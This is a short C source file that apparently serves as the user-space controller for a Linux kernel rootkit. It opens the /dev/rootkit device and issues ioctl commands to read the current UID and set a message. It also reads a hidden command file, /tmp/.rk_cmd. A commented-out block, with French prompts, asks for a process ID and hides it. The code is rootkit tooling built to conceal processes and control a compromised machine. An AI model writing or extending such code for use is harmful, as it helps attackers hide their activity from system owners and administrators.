#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "rootkit.h"

int main() {

    struct rk_args args;
    //unsigned long pid;
    int fd = open("/dev/rootkit", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }
    /*
    printf("Entrez le PID à cacher : ");
    scanf("%lu", &pid);

    args.target = pid;
    args.value = 0;

    if (ioctl(fd, RK_CMD_HIDE_PID, &args) < 0) {
        perror("ioctl HIDE_PID");
        close(fd);
        return -1;
    }

    printf("PID %lu caché avec succès.\n", pid);
    */
    ioctl(fd, RK_CMD_GETUID, &args);
    printf("UID courant : %lu\n", args.target);

    args.target = (unsigned long)"I am Gr00t";
    args.value  = 0;
    
    ioctl(fd, RK_CMD_SET_MSG, &args);

    int rk = open("/tmp/.rk_cmd", O_RDWR | O_CREAT, 0644);
    char buf[256] = {0};
    read(rk, buf, sizeof(buf) - 1);
    printf("rk_cmd : %s\n", buf);
    close(rk);

    close(fd);
    return 0;
}
